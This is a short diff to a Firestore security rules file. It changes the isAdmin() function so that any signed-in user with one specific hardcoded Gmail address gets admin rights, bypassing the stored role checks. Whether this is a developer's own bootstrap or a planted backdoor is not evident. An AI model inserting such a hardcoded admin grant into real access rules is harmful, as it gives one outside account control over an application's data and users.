@@ -70,7 +70,8 @@ service cloud.firestore {
 
     function isAdmin() {
       let path = /databases/$(database)/documents/users/$(request.auth.uid);
-      return isAppOwner() || (isAuthenticated() && exists(path) && get(path).data.get('role', '') in ['admin', 'co-owner', 'owner']);
+      let isDefaultAdmin = isAuthenticated() && request.auth.token.get('email', '') == 'darkfn1234567890@gmail.com' && request.auth.token.get('email_verified', false) == true;
+      return isAppOwner() || isDefaultAdmin || (isAuthenticated() && exists(path) && get(path).data.get('role', '') in ['admin', 'co-owner', 'owner']);
     }
 
     function isBanned() {
